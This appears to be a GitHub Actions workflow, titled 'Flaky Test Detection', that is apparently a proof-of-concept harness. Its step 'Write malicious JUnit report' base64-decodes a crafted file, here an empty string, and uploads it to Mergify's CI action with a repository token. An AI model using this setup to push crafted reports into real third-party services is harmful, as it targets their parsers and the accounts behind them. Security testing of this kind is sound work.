name: Flaky Test Detection

on:
  workflow_dispatch:

jobs:
  flaky-detection-unit:
    name: Unit Tests Flaky Detection (Run ${{ matrix.run_number }})
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        run_number: [1, 2, 3, 4, 5]
    env:
      MERGIFY_TEST_JOB_NAME: unit-tests
    steps:
      - uses: actions/checkout@v4
      - name: Write malicious JUnit report
        id: tests
        continue-on-error: true
        run: echo "" | base64 -d > junit-unit-${{ matrix.run_number }}.xml
      - name: Upload to Mergify
        if: success() || failure()
        uses: mergifyio/gha-mergify-ci@v25
        with:
          token: ${{ secrets.MERGIFY_TOKEN }}
          report_path: "junit-unit-*.xml"
          test_step_outcome: ${{ steps.tests.outcome }}
